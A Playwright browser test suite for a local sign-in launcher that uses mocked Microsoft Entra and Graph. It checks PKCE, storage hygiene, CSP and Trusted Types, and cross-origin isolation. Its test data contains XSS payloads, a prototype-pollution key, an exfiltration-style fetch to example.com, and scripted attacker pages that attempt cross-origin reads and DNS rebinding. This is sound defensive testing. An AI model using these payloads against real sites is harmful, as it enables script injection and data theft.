// P4 browser tests, run in headless Microsoft Edge and Google Chrome against the REAL launcher and the REAL vendored
// MSAL 5.25.1, with Microsoft Entra and Microsoft Graph MOCKED by Playwright request interception (no tenant exists).
// Part A: full sign-in (popup + PKCE + redirect bridge + memoryStorage), both checks with hostile tenant data, request
//         allow-list, CSP/Trusted Types, storage audit, evidence export, sign-out.
// Part B: attacks from other local pages, file:// pages, DNS rebinding and a public website; live (unauthenticated)
//         CORS probes from the launcher origin to the real Microsoft endpoints.
// Run: node prototypes/p4-connected/tests/run-p4-browser.mjs
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { chromium } from 'playwright-core';
import { P4_DIR, startLauncher, stopLauncher, sleep, writeResults, makeChecker } from './lib.mjs';

// Obviously fake identifiers. They are not real tenants, apps or people.
const TENANT = '0000aaaa-1111-2222-3333-444455556666';
const CLIENT = 'cccccccc-1111-2222-3333-444455556666';
const OID = 'dddddddd-1111-2222-3333-444455556666';
const UPN = 'p4.tester@contoso.example';
const HOSTILE_NAME = '<img src=x onerror="window.__xss=\'name\'">P4 Tester';
const ACCESS_TOKEN = 'P4-FAKE-ACCESS-' + crypto.randomBytes(12).toString('hex');
const REFRESH_TOKEN = 'P4-FAKE-REFRESH-' + crypto.randomBytes(12).toString('hex');
const CODE = 'P4-FAKE-CODE-' + crypto.randomBytes(8).toString('hex');
const SCOPES = ['SecurityIncident.Read.All', 'SecurityAlert.Read.All', 'ThreatHunting.Read.All'];
const b64u = (b) => Buffer.from(b).toString('base64url');
const LOGIN = 'https://login.microsoftonline.com';

const results = { probe: 'P4 browser (mocked Entra + Graph)', ranAt: new Date().toISOString(), msal: '@azure/msal-browser 5.25.1 (vendored)', channels: {} };
const check = makeChecker(results);
const SCRATCH = fs.mkdtempSync(path.join(os.tmpdir(), 'armo-p4b-'));

const L = await startLauncher(['-IdleSeconds', '600']);
const P = L.port;
const ORIGIN = `http://localhost:${P}`;
if (!P) { console.error('launcher did not start', L.lines); process.exit(1); }

// ----- hostile Graph payloads ----------------------------------------------------------------------------------
function incidentsPayload() {
  const body = {
    '@odata.context': 'https://graph.microsoft.com/v1.0/$metadata#security/incidents(alerts())',
    '@odata.nextLink': 'https://graph.microsoft.com/v1.0/security/incidents?$top=10&$expand=alerts&$skip=10',
    value: [
      {
        id: '101', tenantId: TENANT, status: 'active', incidentWebUrl: `https://security.microsoft.com/incident2/101/overview?tid=${TENANT}`,
        displayName: '<img src=x onerror="window.__xss=\'title\'">Brute force on VIP account', createdDateTime: '2026-10-18T10:00:00.123Z', severity: 'high',
        assignedTo: UPN, description: '<script>window.__xss="desc"</script>', comments: [{ comment: 'SECRET-COMMENT' }],
        alerts: [
          { serviceSource: 'microsoftSentinel', detectionSource: 'scheduledAlerts', productName: 'Microsoft Sentinel', title: 'SECRET-ALERT-TITLE', evidence: [{ deviceDnsName: 'SECRET-HOST-01', lastIpAddress: '10.9.8.7' }] },
          { serviceSource: 'microsoftDefenderForEndpoint', detectionSource: 'antivirus', productName: 'Microsoft Defender for Endpoint', evidence: [{ userAccount: { accountName: 'SECRET-USER' } }] },
        ],
      },
      {
        id: '102<b>', status: 'weird', incidentWebUrl: 'javascript:alert(1)', displayName: 'Payroll \u202Egnp.exe\u202C =HYPERLINK("http://evil.example") ' + 'A'.repeat(600),
        createdDateTime: 'not-a-date', severity: '<svg onload="window.__xss=\'sev\'">',
        alerts: [{ serviceSource: '<img src=x onerror="window.__xss=\'src\'">', productName: 'P'.repeat(5000) }],
        __PROTO_KEY__: { polluted: 'yes' },
      },
      'not an object', null, 42,
    ],
  };
  return JSON.stringify(body).replace('"__PROTO_KEY__"', '"__proto__"');
}
function huntingPayload() {
  return JSON.stringify({
    '@odata.context': 'https://graph.microsoft.com/v1.0/$metadata#microsoft.graph.security.huntingQueryResults',
    schema: [{ name: 'Table', type: 'String' }, { name: 'Provider', type: 'String' }, { name: 'Items', type: 'Int64' }],
    results: [
      { Table: 'AlertInfo', Provider: 'Microsoft Defender for Endpoint', Items: 40 },
      { table: 'AlertInfo', provider: '<img src=x onerror="window.__xss=\'kql\'">', items: 3 }, // camelCase keys, as in one Microsoft doc example
      { Table: 'SecurityIncident', Provider: 'Azure Sentinel', Items: 12 },
    ],
  });
}

// ----- mocked Microsoft Entra ----------------------------------------------------------------------------------
function idToken(nonce) {
  const now = Math.floor(Date.now() / 1000);
  const payload = { aud: CLIENT, iss: `${LOGIN}/${TENANT}/v2.0`, iat: now, nbf: now, exp: now + 3600, name: HOSTILE_NAME, oid: OID, preferred_username: UPN, sub: 'p4-sub', tid: TENANT, nonce, ver: '2.0' };
  return `${b64u(JSON.stringify({ alg: 'RS256', typ: 'JWT', kid: 'p4' }))}.${b64u(JSON.stringify(payload))}.${b64u('not-a-real-signature')}`;
}
const oidc = () => JSON.stringify({
  token_endpoint: `${LOGIN}/${TENANT}/oauth2/v2.0/token`, authorization_endpoint: `${LOGIN}/${TENANT}/oauth2/v2.0/authorize`, end_session_endpoint: `${LOGIN}/${TENANT}/oauth2/v2.0/logout`,
  issuer: `${LOGIN}/${TENANT}/v2.0`, jwks_uri: `${LOGIN}/${TENANT}/discovery/v2.0/keys`, response_modes_supported: ['query', 'fragment', 'form_post'], response_types_supported: ['code', 'id_token', 'code id_token', 'id_token token'],
  scopes_supported: ['openid', 'profile', 'email', 'offline_access'], subject_types_supported: ['pairwise'], id_token_signing_alg_values_supported: ['RS256'], token_endpoint_auth_methods_supported: ['client_secret_post', 'private_key_jwt', 'client_secret_basic'],
  http_logout_supported: true, frontchannel_logout_supported: true, request_uri_parameter_supported: false, cloud_instance_name: 'microsoftonline.com', cloud_graph_host_name: 'graph.windows.net', msgraph_host: 'graph.microsoft.com', tenant_region_scope: 'EU',
});
const discovery = () => JSON.stringify({ tenant_discovery_endpoint: `${LOGIN}/${TENANT}/v2.0/.well-known/openid-configuration`, 'api-version': '1.1', metadata: [{ preferred_network: 'login.microsoftonline.com', preferred_cache: 'login.windows.net', aliases: ['login.microsoftonline.com', 'login.windows.net', 'login.microsoft.com', 'sts.windows.net'] }] });

async function runFlow(channel) {
  const obs = { requests: [], consoleErrors: [], login: {}, graph: [] };
  results.channels[channel] = obs;
  const tag = (id) => `${id}-${channel}`;
  const browser = await chromium.launch({ channel, headless: true });
  const context = await browser.newContext({ acceptDownloads: true });
  await context.addInitScript(() => { window.__cspv = []; document.addEventListener('securitypolicyviolation', (e) => window.__cspv.push(`${e.violatedDirective} ${e.blockedURI}`)); });
  context.on('request', (r) => obs.requests.push(`${r.method()} ${r.url().split('?')[0].split('#')[0]}`));
  let page;
  let authorize = null;
  let sessionAtAuthorize = null;

  await context.route(/^https:\/\/login\.microsoftonline\.com\//, async (route) => {
    const req = route.request();
    const url = new URL(req.url());
    const cors = { 'access-control-allow-origin': '*', 'content-type': 'application/json; charset=utf-8' };
    if (req.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: { ...cors, 'access-control-allow-headers': '*', 'access-control-allow-methods': 'GET, POST, OPTIONS' } });
    if (url.pathname.endsWith('/.well-known/openid-configuration')) { obs.login.metadataFetched = true; return route.fulfill({ status: 200, headers: cors, body: oidc() }); }
    if (url.pathname === '/common/discovery/instance') { obs.login.instanceDiscoveryFetched = true; return route.fulfill({ status: 200, headers: cors, body: discovery() }); }
    if (url.pathname.endsWith('/oauth2/v2.0/authorize')) {
      authorize = Object.fromEntries(url.searchParams);
      try { sessionAtAuthorize = await page.evaluate(() => Object.keys(sessionStorage).map((k) => [k, sessionStorage.getItem(k)])); } catch (e) { sessionAtAuthorize = 'unreadable: ' + e.message; }
      const clientInfo = b64u(JSON.stringify({ uid: OID, utid: TENANT }));
      const loc = `${authorize.redirect_uri}#code=${CODE}&client_info=${clientInfo}&state=${encodeURIComponent(authorize.state)}&session_state=p4-session`;
      return route.fulfill({ status: 302, headers: { location: loc, 'cache-control': 'no-store' }, body: '' });
    }
    if (url.pathname.endsWith('/oauth2/v2.0/token')) {
      const form = Object.fromEntries(new URLSearchParams(req.postData() || ''));
      const headers = await req.allHeaders();
      obs.login.token = {
        grantType: form.grant_type, codeMatches: form.code === CODE, hasVerifier: !!form.code_verifier, hasClientSecret: 'client_secret' in form,
        pkceS256Valid: !!form.code_verifier && authorize && b64u(crypto.createHash('sha256').update(form.code_verifier).digest()) === authorize.code_challenge,
        redirectUri: form.redirect_uri && form.redirect_uri.replace(String(P), '<port>'), origin: (headers.origin || '').replace(String(P), '<port>'),
      };
      obs.login.verifierWasInSessionStorage = Array.isArray(sessionAtAuthorize) && form.code_verifier ? sessionAtAuthorize.some(([, v]) => String(v).includes(form.code_verifier) || String(v).includes(Buffer.from(form.code_verifier).toString('base64'))) : 'unknown';
      return route.fulfill({ status: 200, headers: cors, body: JSON.stringify({
        token_type: 'Bearer', scope: SCOPES.map((s) => `https://graph.microsoft.com/${s}`).join(' ') + ' openid profile', expires_in: 3599, ext_expires_in: 3599,
        access_token: ACCESS_TOKEN, refresh_token: REFRESH_TOKEN, id_token: idToken(authorize && authorize.nonce), client_info: b64u(JSON.stringify({ uid: OID, utid: TENANT })),
      }) });
    }
    obs.login.unexpected = (obs.login.unexpected || []).concat(`${req.method()} ${url.pathname}`);
    return route.fulfill({ status: 404, headers: cors, body: '{}' });
  });

  await context.route(/^https:\/\/graph\.microsoft\.com\//, async (route) => {
    const req = route.request();
    const cors = { 'access-control-allow-origin': '*', 'content-type': 'application/json; charset=utf-8', 'request-id': 'p4-request-id' };
    if (req.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: { ...cors, 'access-control-allow-headers': 'authorization,content-type', 'access-control-allow-methods': 'GET, POST' } });
    const headers = await req.allHeaders();
    const entry = { method: req.method(), url: req.url(), bearerOk: headers.authorization === `Bearer ${ACCESS_TOKEN}`, cookieSent: 'cookie' in headers, referer: headers.referer || null };
    obs.graph.push(entry);
    if (req.method() === 'GET' && req.url() === 'https://graph.microsoft.com/v1.0/security/incidents?$top=10&$expand=alerts') return route.fulfill({ status: 200, headers: cors, body: incidentsPayload() });
    if (req.method() === 'POST' && req.url() === 'https://graph.microsoft.com/v1.0/security/runHuntingQuery') { entry.body = JSON.parse(req.postData() || '{}'); return route.fulfill({ status: 200, headers: cors, body: huntingPayload() }); }
    return route.fulfill({ status: 404, headers: cors, body: '{"error":{"code":"NotMocked"}}' });
  });

  page = await context.newPage();
  page.on('console', (m) => { if (m.type() === 'error') obs.consoleErrors.push(m.text().slice(0, 200)); });
  page.on('pageerror', (e) => obs.consoleErrors.push('pageerror ' + String(e.message).slice(0, 200)));

  // A1 load + prefill
  const resp = await page.goto(`${ORIGIN}/#tenant=${TENANT}&client=${CLIENT}`);
  await page.waitForFunction(() => document.getElementById('kql').textContent.length > 0);
  const load = await page.evaluate(() => ({ envError: !document.getElementById('env-error').hidden, hash: location.hash, tenant: document.getElementById('tenant').value, client: document.getElementById('client').value, signinDisabled: document.getElementById('signin').disabled, secure: isSecureContext }));
  const h = resp.headers();
  check(tag('A1'), 'page loads from the launcher with CSP, COOP and frame-ancestors headers; no environment error', !load.envError && load.secure && /frame-ancestors 'none'/.test(h['content-security-policy'] || '') && h['cross-origin-opener-policy'] === 'same-origin', { status: resp.status(), coop: h['cross-origin-opener-policy'], secureContext: load.secure });
  check(tag('A2'), 'launcher prefill (#tenant/#client) is applied and removed from the address bar; sign-in stays disabled until consent', load.tenant === TENANT && load.client === CLIENT && load.hash === '' && load.signinDisabled, { hashAfter: load.hash, signinDisabled: load.signinDisabled });

  // A3 sign-in through the popup
  await page.check('#consent');
  const popupP = page.waitForEvent('popup', { timeout: 15000 });
  await page.click('#signin');
  const popup = await popupP;
  let signedIn = true;
  try { await page.waitForSelector('#s-session:not([hidden])', { timeout: 30000 }); } catch (e) { signedIn = false; }
  const status = await page.textContent('#signin-status');
  await popup.waitForEvent('close', { timeout: 5000 }).catch(() => {});
  obs.login.authorize = authorize && {
    response_type: authorize.response_type, response_mode: authorize.response_mode, code_challenge_method: authorize.code_challenge_method, hasCodeChallenge: !!authorize.code_challenge,
    redirect_uri: authorize.redirect_uri && authorize.redirect_uri.replace(String(P), '<port>'), client_id_matches: authorize.client_id === CLIENT, prompt: authorize.prompt,
    scope: authorize.scope, hasNonce: !!authorize.nonce, hasState: !!authorize.state, hasClientSecret: 'client_secret' in authorize,
  };
  obs.login.sessionStorageKeysDuringPopup = Array.isArray(sessionAtAuthorize) ? sessionAtAuthorize.map(([k]) => k.replace(CLIENT, '<client-id>').replace(/[0-9a-f]{8}-[0-9a-f-]{27}/g, '<guid>')) : sessionAtAuthorize;
  check(tag('A3'), 'sign-in completes: popup -> mocked Entra -> launcher /redirect.html -> BroadcastChannel -> main page', signedIn && popup.isClosed(), { signedIn, popupClosed: popup.isClosed(), status: status.slice(0, 120) });
  const a = obs.login.authorize || {};
  const scopeSet = new Set(String(a.scope || '').split(' '));
  check(tag('A4'), 'authorization request is auth code + PKCE S256, response in the URL fragment, redirect http://localhost:<port>/redirect.html, exact scopes', a.response_type === 'code' && a.response_mode === 'fragment' && a.code_challenge_method === 'S256' && a.hasCodeChallenge && a.redirect_uri === 'http://localhost:<port>/redirect.html' && a.client_id_matches && !a.hasClientSecret && SCOPES.every((s) => scopeSet.has(`https://graph.microsoft.com/${s}`)) && ['openid', 'profile', 'offline_access'].every((s) => scopeSet.has(s)) && scopeSet.size === 6, a);
  const t = obs.login.token || {};
  check(tag('A5'), 'token redemption sends the PKCE verifier (S256 matches), no secret, with an Origin header', t.grantType === 'authorization_code' && t.codeMatches && t.pkceS256Valid && !t.hasClientSecret && t.origin === 'http://localhost:<port>', t);

  // A6 storage audit after sign-in
  const audit = async () => page.evaluate(async (secrets) => {
    const ss = Object.keys(sessionStorage).map((k) => sessionStorage.getItem(k)).join('\n');
    const ls = Object.keys(localStorage).map((k) => localStorage.getItem(k)).join('\n');
    const dbs = indexedDB.databases ? (await indexedDB.databases()).map((d) => d.name) : 'n/a';
    return { localStorageKeys: localStorage.length, sessionStorageKeys: Object.keys(sessionStorage).length, secretsInWebStorage: secrets.filter((s) => ss.includes(s) || ls.includes(s)).length, cookie: document.cookie, indexedDb: dbs, cacheStorage: await caches.keys() };
  }, [ACCESS_TOKEN, REFRESH_TOKEN, 'eyJ', CODE]);
  const afterSignIn = await audit();
  obs.storageAfterSignIn = afterSignIn;
  check(tag('A6'), 'after sign-in: no token, refresh token, ID token or code in localStorage/sessionStorage; no cookies, IndexedDB or Cache Storage', afterSignIn.secretsInWebStorage === 0 && afterSignIn.localStorageKeys === 0 && afterSignIn.cookie === '' && Array.isArray(afterSignIn.indexedDb) && afterSignIn.indexedDb.length === 0 && afterSignIn.cacheStorage.length === 0, { ...afterSignIn, pkceVerifierInSessionStorageWhilePopupOpen: obs.login.verifierWasInSessionStorage, sessionStorageKeysDuringPopup: obs.login.sessionStorageKeysDuringPopup });
  const who = await page.textContent('#who');
  check(tag('A7'), 'hostile account display name is rendered as text', who === HOSTILE_NAME && (await page.evaluate(() => window.__xss)) === undefined, who);

  // A8 check 1
  await page.click('#run-incidents');
  await page.waitForSelector('#out-incidents table', { timeout: 15000 });
  const inc = await page.evaluate(() => {
    const out = document.getElementById('out-incidents');
    return { text: out.textContent, cells: [...out.querySelectorAll('tbody tr')].map((tr) => [...tr.children].map((td) => td.textContent)), injected: out.querySelectorAll('img, script, svg, iframe, a').length, xss: window.__xss, polluted: ({}).polluted, bodyText: document.body.textContent };
  });
  const g1 = obs.graph.find((x) => x.method === 'GET') || {};
  check(tag('A8'), 'check 1 sends exactly GET /v1.0/security/incidents?$top=10&$expand=alerts with the bearer token, no cookies or referrer', g1.bearerOk && !g1.cookieSent && g1.referer === null && obs.graph.filter((x) => x.method === 'GET').length === 1, { url: g1.url, bearerOk: g1.bearerOk, cookieSent: g1.cookieSent, referer: g1.referer });
  const row1 = inc.cells[0] || [];
  const row2 = inc.cells[1] || [];
  check(tag('A9'), 'hostile incident data renders as inert text (no elements created, no script ran, no prototype pollution)', inc.injected === 0 && inc.xss === undefined && inc.polluted === undefined && row1[3] === '<img src=x onerror="window.__xss=\'title\'">Brute force on VIP account' && inc.cells.length === 2, { rows: inc.cells.length, injectedElements: inc.injected, xss: inc.xss ?? null, polluted: inc.polluted ?? null, row1Title: row1[3] });
  check(tag('A10'), 'bidi/control characters neutralised, long strings capped, unknown enums and bad URLs downgraded', !row2[3].includes('\u202E') && row2[3].includes('\uFFFD') && row2[3].length <= 301 && row2[1] === 'other' && row2[0] === '' && (row2[5] === '(invalid)' || row2[5] === '(not https)'), { row2: row2.map((c) => c.slice(0, 60)) });
  check(tag('A11'), 'alert titles, entity evidence and comments returned by Graph are discarded, never shown', !/SECRET-(HOST|USER|ALERT|COMMENT)/.test(inc.bodyText), 'no SECRET-* strings in page');
  check(tag('A12'), 'Sentinel provenance detected from alert serviceSource', /Incidents with Microsoft Sentinel alerts \(serviceSource microsoftSentinel\): 1 of 2\./.test(inc.text) && /security\.microsoft\.com 1/.test(inc.text), inc.text.split('\n')[0].slice(0, 200));

  // A13 check 2
  await page.click('#run-hunting');
  await page.waitForSelector('#out-hunting table', { timeout: 15000 });
  const hun = await page.evaluate(() => ({ text: document.getElementById('out-hunting').textContent, cells: [...document.querySelectorAll('#out-hunting tbody tr')].map((tr) => [...tr.children].map((td) => td.textContent)), injected: document.querySelectorAll('#out-hunting img, #out-hunting script').length, xss: window.__xss, kql: document.getElementById('kql').textContent }));
  const g2 = obs.graph.find((x) => x.method === 'POST') || {};
  check(tag('A13'), 'check 2 sends exactly one POST runHuntingQuery with the fixed query shown on the consent screen and Timespan P7D', g2.bearerOk && g2.body && g2.body.Query === hun.kql && g2.body.Timespan === 'P7D' && Object.keys(g2.body).length === 2, { bodyKeys: g2.body && Object.keys(g2.body), queryMatchesConsentScreen: g2.body && g2.body.Query === hun.kql });
  check(tag('A14'), 'hunting rows render as text; PascalCase and camelCase result keys both map to columns', hun.injected === 0 && hun.xss === undefined && hun.cells.length === 3 && hun.cells[1][1] === '<img src=x onerror="window.__xss=\'kql\'">' && /SecurityIncident \(Microsoft Sentinel table\) distinct incidents by provider: Azure Sentinel 12/.test(hun.text), hun.cells);

  // A15 request allow-list, CSP and Trusted Types
  const guard = await page.evaluate(async () => {
    const r = {};
    r.deleteIncidents = await window.__p4.tryRequest('DELETE', 'https://graph.microsoft.com/v1.0/security/incidents?$top=10&$expand=alerts');
    r.patchIncident = await window.__p4.tryRequest('PATCH', 'https://graph.microsoft.com/v1.0/security/incidents/101');
    r.getMe = await window.__p4.tryRequest('GET', 'https://graph.microsoft.com/v1.0/me');
    r.getIncidentsOtherQuery = await window.__p4.tryRequest('GET', 'https://graph.microsoft.com/v1.0/security/incidents');
    try { await fetch('https://example.com/exfil?x=1'); r.fetchOtherHost = 'NOT BLOCKED'; } catch (e) { r.fetchOtherHost = 'blocked'; }
    try { await fetch('https://management.azure.com/subscriptions'); r.fetchArm = 'NOT BLOCKED'; } catch (e) { r.fetchArm = 'blocked'; }
    try { document.getElementById('out-hunting').innerHTML = '<b>x</b>'; r.innerHTML = 'ALLOWED'; } catch (e) { r.innerHTML = 'blocked: ' + e.name; }
    // Note: code injected over the DevTools protocol is exempt from CSP eval checks, so eval() cannot be tested this
    // way. The CSP has no 'unsafe-eval'; prototype P3 showed eval is blocked for page scripts under such a policy.
    r.cspHasNoUnsafeEval = !document.querySelector('meta[http-equiv="Content-Security-Policy"]').content.includes('unsafe-eval');
    try { const s = document.createElement('script'); s.textContent = 'window.__inj=1'; document.body.append(s); r.inlineScript = window.__inj ? 'RAN' : 'did not run'; } catch (e) { r.inlineScript = 'blocked: ' + e.name; }
    await new Promise((res) => setTimeout(res, 300));
    r.cspViolations = window.__cspv.slice();
    return r;
  });
  check(tag('A15'), 'any request other than the two documented ones is refused in code; other hosts blocked by CSP; innerHTML and injected scripts blocked by Trusted Types', guard.deleteIncidents.startsWith('refused') && guard.patchIncident.startsWith('refused') && guard.getMe.startsWith('refused') && guard.getIncidentsOtherQuery.startsWith('refused') && guard.fetchOtherHost === 'blocked' && guard.fetchArm === 'blocked' && guard.innerHTML.startsWith('blocked') && guard.cspHasNoUnsafeEval && guard.inlineScript !== 'RAN', guard);
  check(tag('A16'), 'the refused requests never reached the network', obs.graph.length === 2, obs.graph.map((x) => `${x.method} ${x.url}`));

  // A17 evidence export
  const exportDisabledBeforePreview = await page.isDisabled('#export');
  await page.fill('#alias', 'SOC-TEST <b>');
  await page.fill('#operator', 'Analyst A');
  await page.click('#preview');
  const previewText = await page.textContent('#export-preview');
  const dlP = page.waitForEvent('download');
  await page.click('#export');
  const dl = await dlP;
  const exported = fs.readFileSync(await dl.path(), 'utf8');
  const note = JSON.parse(exported);
  const forbidden = { accessToken: ACCESS_TOKEN, refreshToken: REFRESH_TOKEN, code: CODE, tenantId: TENANT, clientId: CLIENT, objectId: OID, upn: UPN, tid: 'tid=', idTokenPrefix: 'eyJ', secretEntity: 'SECRET-', incidentTitle: 'Brute force on VIP', displayName: 'P4 Tester' };
  const leaks = Object.entries(forbidden).filter(([, v]) => exported.includes(v)).map(([k]) => k);
  check(tag('A17'), 'export requires a preview; the downloaded file equals the preview', exportDisabledBeforePreview && exported === previewText && /^armohub-connected-evidence-SOC-TEST-b-\d{8}T\d{4}\.json$/.test(dl.suggestedFilename()), { exportDisabledBeforePreview, file: dl.suggestedFilename() });
  check(tag('A18'), 'evidence note contains findings for TRN-13 and VAL-12 and no tokens, tenant/client/object IDs, account names, entity data or titles', note.schema === 'armohub.dma.connected-evidence' && note.schemaVersion === 1 && note.readOnly === true && note.findings.map((f) => f.checkId).join() === 'TRN-13,VAL-12' && leaks.length === 0, { findings: note.findings.map((f) => `${f.checkId}: ${f.title}`), leaks });
  if (channel === 'msedge') fs.writeFileSync(path.join(P4_DIR, 'p4-sample-evidence-note.json'), exported);
  await page.check('#include-titles');
  const disabledAfterChange = await page.isDisabled('#export');
  await page.click('#preview');
  const withTitles = await page.textContent('#export-preview');
  check(tag('A19'), 'changing an option forces a new preview; titles appear only when ticked, still sanitised', disabledAfterChange && withTitles.includes('Brute force on VIP') && !withTitles.includes('\u202E') && !withTitles.includes(TENANT) && !withTitles.includes(ACCESS_TOKEN), { disabledAfterChange });

  // A20 network inventory
  const hosts = [...new Set(obs.requests.map((r) => new URL(r.split(' ')[1]).host.replace(String(P), '<port>')))];
  obs.hostsContacted = hosts;
  check(tag('A20'), 'the browser contacted only the launcher, login.microsoftonline.com and graph.microsoft.com', hosts.every((x) => ['localhost:<port>', 'login.microsoftonline.com', 'graph.microsoft.com'].includes(x)), { hosts, loginRequests: obs.requests.filter((r) => r.includes('login.microsoftonline.com')).map((r) => r.replace(TENANT, '<tenant>')) });

  // A21 forget
  const reloaded = page.waitForEvent('load');
  await page.click('#signout');
  await reloaded;
  await page.waitForFunction(() => document.getElementById('kql').textContent.length > 0);
  const afterForget = await audit();
  const sessionHidden = await page.evaluate(() => document.getElementById('s-session').hidden);
  check(tag('A21'), '"Forget tokens" clears MSAL and reloads; nothing remains in any browser storage', sessionHidden && afterForget.sessionStorageKeys === 0 && afterForget.localStorageKeys === 0 && afterForget.cookie === '', afterForget);
  // A15 deliberately triggers CSP and Trusted Types errors; everything else must be error-free.
  const deliberate = /Content Security Policy|TrustedHTML|TrustedScript|example\.com\/exfil|management\.azure\.com/;
  const unexpected = obs.consoleErrors.filter((m) => !deliberate.test(m));
  check(tag('A22'), 'no console errors during the flow other than those the A15 attack step causes on purpose', unexpected.length === 0, { unexpected, deliberateA15Errors: obs.consoleErrors.length - unexpected.length });
  await browser.close();
}

for (const channel of ['msedge', 'chrome']) await runFlow(channel);
check('A23', 'launcher log never contains the authorization code (it travels in the URL fragment)', !L.lines.join('\n').includes(CODE), L.lines.filter((l) => /redirect/.test(l)).slice(0, 4));

// ----- Part B: attacks and live probes ---------------------------------------------------------------------------
const logMark = () => L.lines.length;
const logSince = (mark) => L.lines.slice(mark).filter((l) => /^\d\d:\d\d:\d\d /.test(l)).map((l) => l.slice(9));

// B1 another local web page on a different localhost port (for example a malicious or compromised local dev server)
const attackerHtml = (target) => `<!doctype html><meta charset=utf-8><body><script>
window.run = async () => {
  const r = {};
  try { const x = await fetch('${target}/connected.js'); r.corsFetch = 'READ ' + x.status; } catch (e) { r.corsFetch = 'blocked (' + e.name + ')'; }
  try { const x = await fetch('${target}/connected.js', { mode: 'no-cors' }); r.noCorsFetch = 'opaque=' + (x.type === 'opaque'); } catch (e) { r.noCorsFetch = 'blocked (' + e.name + ')'; }
  r.scriptTag = await new Promise((res) => { const s = document.createElement('script'); s.src = '${target}/vendor/msal-browser.min.js'; s.onload = () => res('LOADED, msal=' + typeof window.msal); s.onerror = () => res('blocked'); document.body.append(s); });
  r.iframe = await new Promise((res) => { const f = document.createElement('iframe'); f.src = '${target}/'; f.onload = () => { try { res('loaded, readable=' + !!f.contentDocument.body.innerText); } catch (e) { res('loaded but cross-origin (' + e.name + ')'); } }; document.body.append(f); setTimeout(() => res('no load event'), 3000); });
  const w = window.open('${target}/');
  await new Promise((res) => setTimeout(res, 1500));
  try { r.windowOpenRead = 'READ ' + w.document.title; } catch (e) { r.windowOpenRead = 'cross-origin (' + e.name + ')'; }
  try { w.close(); } catch (e) {}
  localStorage.setItem('attacker', '1');
  document.cookie = 'p4probe=from-other-port; path=/';
  return r;
};
</script>`;
const attackerServer = http.createServer((req, res) => { res.writeHead(200, { 'content-type': 'text/html' }); res.end(attackerHtml(ORIGIN)); });
await new Promise((r) => attackerServer.listen(0, '127.0.0.1', r));
const OTHER = attackerServer.address().port;
const partB = {};
for (const channel of ['msedge', 'chrome']) {
  const browser = await chromium.launch({ channel, headless: true });
  const ctx = await browser.newContext();
  const pg = await ctx.newPage();
  const mark = logMark();
  await pg.goto(`http://localhost:${OTHER}/`);
  const r = await pg.evaluate(() => window.run());
  await sleep(500);
  const ours = await ctx.newPage();
  await ours.goto(`${ORIGIN}/`);
  const seen = await ours.evaluate(() => ({ attackerLocalStorageVisible: localStorage.getItem('attacker'), cookieVisible: document.cookie }));
  partB[channel] = { otherLocalPage: { ...r, ...seen, launcherLog: logSince(mark) } };
  await browser.close();
}
attackerServer.close();
results.partB = partB;
for (const [channel, v] of Object.entries(partB)) {
  const o = v.otherLocalPage;
  check(`B1-${channel}`, 'a page on another localhost port cannot read our files, run our scripts, frame or script our page', o.corsFetch.startsWith('blocked') && o.scriptTag === 'blocked' && !o.iframe.includes('readable=true') && !o.windowOpenRead.startsWith('READ') && o.attackerLocalStorageVisible === null, { ...o, launcherLog: o.launcherLog.slice(0, 8) });
  check(`B2-${channel}`, 'observed: cookies are shared across localhost ports (why the app must never use cookies)', o.cookieVisible.includes('p4probe'), o.cookieVisible);
}

// B3 a local HTML file (file://) -> launcher
const filePage = path.join(SCRATCH, 'attacker.html');
fs.writeFileSync(filePage, attackerHtml(ORIGIN).replace("localStorage.setItem('attacker', '1');", '').replace("document.cookie = 'p4probe=from-other-port; path=/';", ''));
for (const channel of ['msedge', 'chrome']) {
  const browser = await chromium.launch({ channel, headless: true });
  const pg = await browser.newPage();
  const mark = logMark();
  await pg.goto(pathToFileURL(filePage).href);
  const r = await pg.evaluate(() => window.run());
  await sleep(300);
  partB[channel].filePage = { ...r, launcherLog: logSince(mark) };
  check(`B3-${channel}`, 'a local file:// page cannot read our files or script our page', r.corsFetch.startsWith('blocked') && r.scriptTag === 'blocked' && !r.windowOpenRead.startsWith('READ'), { ...r, launcherLog: logSince(mark).slice(0, 6) });
  await browser.close();
}

// B4 DNS rebinding, simulated by mapping a hostname to 127.0.0.1 inside the browser
for (const channel of ['msedge', 'chrome']) {
  const browser = await chromium.launch({ channel, headless: true, args: ['--host-resolver-rules=MAP rebind.p4.test 127.0.0.1'] });
  const pg = await browser.newPage();
  const r = await pg.goto(`http://rebind.p4.test:${P}/`);
  const body = (await pg.textContent('body')).trim();
  partB[channel].dnsRebinding = { status: r.status(), body };
  check(`B4-${channel}`, 'DNS rebinding (attacker hostname resolving to 127.0.0.1) gets 421, never the app', r.status() === 421, { status: r.status(), body });
  await browser.close();
}

// B5 a public website probing the loopback port (Local Network Access); needs internet
for (const channel of ['msedge', 'chrome']) {
  const browser = await chromium.launch({ channel, headless: true });
  const pg = await browser.newPage();
  let r;
  const mark = logMark();
  try {
    await pg.goto('https://example.com/', { timeout: 20000 });
    r = await pg.evaluate(async (target) => {
      const o = {};
      try { const x = await fetch(target + '/connected.js'); o.cors = 'READ ' + x.status; } catch (e) { o.cors = 'blocked (' + e.message.slice(0, 80) + ')'; }
      try { const x = await fetch(target + '/connected.js', { mode: 'no-cors' }); o.noCors = 'opaque=' + (x.type === 'opaque'); } catch (e) { o.noCors = 'blocked (' + e.message.slice(0, 80) + ')'; }
      return o;
    }, ORIGIN);
  } catch (e) { r = { error: e.message.split('\n')[0] }; }
  await sleep(300);
  r.reachedLauncher = logSince(mark);
  partB[channel].publicWebsite = r;
  check(`B5-${channel}`, 'a public website cannot read anything from the launcher (whether or not Local Network Access blocks the request first)', !String(r.cors).startsWith('READ'), r);
  await browser.close();
}

// B6 live, unauthenticated CORS probes from the launcher origin to the real Microsoft endpoints (no mocks, no tenant)
for (const channel of ['msedge', 'chrome']) {
  const browser = await chromium.launch({ channel, headless: true });
  const pg = await browser.newPage();
  await pg.goto(`${ORIGIN}/`);
  let r;
  try {
    r = await pg.evaluate(async () => {
      const o = {};
      const probe = async (name, url, init) => {
        try {
          const x = await fetch(url, init);
          let code = '';
          try { const j = await x.json(); code = (j.error && (j.error.code || j.error)) || (j.error_codes && 'AADSTS' + j.error_codes[0]) || (j.issuer ? 'metadata' : ''); } catch (e) { code = 'non-json'; }
